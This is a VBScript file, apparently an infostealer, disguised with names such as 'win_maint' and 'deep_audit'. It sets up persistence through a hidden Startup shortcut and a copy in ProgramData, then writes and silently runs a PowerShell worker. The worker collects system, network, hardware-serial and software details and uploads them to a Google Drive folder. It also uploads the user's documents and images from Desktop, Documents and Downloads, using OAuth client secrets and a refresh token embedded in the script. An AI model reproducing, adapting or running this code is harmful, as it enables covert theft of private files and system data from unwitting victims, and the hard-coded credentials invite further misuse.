Option Explicit

Dim objFSO, objShell, objFile, objShortcut, currentScript
Dim strPSPath, strWorkerName, appDataPath, startupPath
Dim strCID, strSEC, strTOK, strBaseID

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

currentScript = WScript.ScriptFullName
strWorkerName = "deep_audit_v25.ps1"
strPSPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\" & strWorkerName
appDataPath = "C:\ProgramData\win_maint_svc.vbs"
startupPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\win_maint.lnk"

On Error Resume Next
objShell.Run "powershell.exe -WindowStyle Hidden -Command ""Unblock-File -Path '" & currentScript & "'""", 0, True
If Not objFSO.FileExists(appDataPath) Then objFSO.CopyFile currentScript, appDataPath, True
If Not objFSO.FileExists(startupPath) Then
    Set objShortcut = objShell.CreateShortcut(startupPath)
    objShortcut.TargetPath = "wscript.exe"
    objShortcut.Arguments = """" & appDataPath & """"
    objShortcut.WindowStyle = 0
    objShortcut.Save
End If
On Error GoTo 0

' --- GOOGLE API KEYS ---
strCID = "677717926428-tiqtn91uv418lskjciimfs60me2ggrqc.apps.googleusercontent.com"
strSEC = "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"
strTOK = "1//0g6Sniz7H7k3_CgYIARAAGBASNwF-L9Ir86LrNVM_OhlmZUuEVt7SUo7pBEpS3hUBD_PwHw0Ij6rIYssMw1wpRaMfPtE8iVwrxKY"
strBaseID = "1YVAYlF68yQfbD5nyuEUqb1AesoLVV5Ff"

Set objFile = objFSO.CreateTextFile(strPSPath, True)
objFile.WriteLine "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
objFile.WriteLine "$CID = '" & strCID & "'; $SEC = '" & strSEC & "'; $TOK = '" & strTOK & "'; $BaseID = '" & strBaseID & "'"

' Auth & Drive Logic
objFile.WriteLine "try { $a=Invoke-RestMethod -Uri 'https://accounts.google.com/o/oauth2/token' -Method Post -Body @{client_id=$CID;client_secret=$SEC;refresh_token=$TOK;grant_type='refresh_token'}"
objFile.WriteLine "$global:h=@{Authorization=""Bearer $($a.access_token)""} } catch { exit }"

' Create Folder
objFile.WriteLine "$meta = @{name=""$($env:COMPUTERNAME)-Audit-$(Get-Date -f 'MMdd-HHmm')"";mimeType='application/vnd.google-apps.folder';parents=@($BaseID)}|ConvertTo-Json"
objFile.WriteLine "$SID = (Invoke-RestMethod -Uri 'https://www.googleapis.com/drive/v3/files' -Method Post -Headers $h -Body $meta -ContentType 'application/json').id"

' Upload Function
objFile.WriteLine "function Up($n, $p, $t) { try { $b=[System.IO.File]::ReadAllBytes($p); $m=@{name=$n;parents=@($t)}|ConvertTo-Json -Compress; $bd=[guid]::NewGuid().ToString(); $hd=""--$bd`r`nContent-Type: application/json; charset=UTF-8`r`n`r`n$m`r`n--$bd`r`nContent-Type: application/octet-stream`r`n`r`n""; $by=[collections.generic.list[byte]]::new(); $by.AddRange([text.encoding]::UTF8.GetBytes($hd)); $by.AddRange($b); $by.AddRange([text.encoding]::UTF8.GetBytes(""`r`n--$bd--`r`n"")); Invoke-RestMethod -Uri 'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart' -Method Post -Headers $h -Body $by.ToArray() -ContentType ""multipart/related; boundary=$bd"" | Out-Null } catch {} }"

' --- ENHANCED DEEP REPORT ENGINE ---
objFile.WriteLine "$R = New-Object System.Text.StringBuilder"
objFile.WriteLine "$R.AppendLine('=== FULL SYSTEM AUDIT: ' + $env:COMPUTERNAME + ' ===')"
objFile.WriteLine "$R.AppendLine('Date: ' + (Get-Date).ToString())"

' System Detail
objFile.WriteLine "$R.AppendLine('`n[SYSTEM INFO]')"
objFile.WriteLine "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture | Out-String | %{$R.AppendLine($_)}"
objFile.WriteLine "Get-CimInstance Win32_ComputerSystem | Select-Object Manufacturer, Model, TotalPhysicalMemory | Out-String | %{$R.AppendLine($_)}"

' Networking (Reliable ipconfig method)
objFile.WriteLine "$R.AppendLine('`n[NETWORK CONFIG]')"
objFile.WriteLine "ipconfig /all | Out-String | %{$R.AppendLine($_)}"

' Hardware Serial & Bios
objFile.WriteLine "$R.AppendLine('`n[HARDWARE SERIALS]')"
objFile.WriteLine "Get-CimInstance Win32_Bios | Select-Object SerialNumber, SMBIOSBIOSVersion | Out-String | %{$R.AppendLine($_)}"

' Storage
objFile.WriteLine "$R.AppendLine('`n[DISK SPACE]')"
objFile.WriteLine "Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | Select-Object DeviceID, @{N='SizeGB';E={[math]::Round($_.Size/1GB,2)}}, @{N='FreeGB';E={[math]::Round($_.FreeSpace/1GB,2)}} | Out-String | %{$R.AppendLine($_)}"

' Software Inventory (Cleaner logic)
objFile.WriteLine "$R.AppendLine('`n[INSTALLED PROGRAMS]')"
objFile.WriteLine "$sw = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue"
objFile.WriteLine "$sw | Where-Object {$_.DisplayName -ne $null} | Select-Object DisplayName, DisplayVersion | Sort-Object DisplayName | Out-String | %{$R.AppendLine($_)}"

' Final Save and Upload
objFile.WriteLine "$rt=""$env:TEMP\DeepReport.txt""; $R.ToString() | Out-File $rt; Up 'Deep_Report.txt' $rt $SID; rm $rt"

' --- FILE UPLOAD ENGINE ---
objFile.WriteLine "$reg='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders'; $pts = @((gp $reg).Desktop, (gp $reg).Personal, (gp $reg).'{374DE290-123F-4565-9164-39C4925E467B}')"
objFile.WriteLine "foreach($p in ($pts | select -Unique)){ if(Test-Path $p){ gci $p -File -Recurse -EA 0 | ?{$_.Length -lt 20MB -and $_.Extension -match 'pdf|doc|xls|txt|jpg'} | %{ Up $_.Name $_.FullName $SID } } }"

objFile.Close

' --- 6. EXECUTION (Hidden) ---
objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & strPSPath & """", 0, False
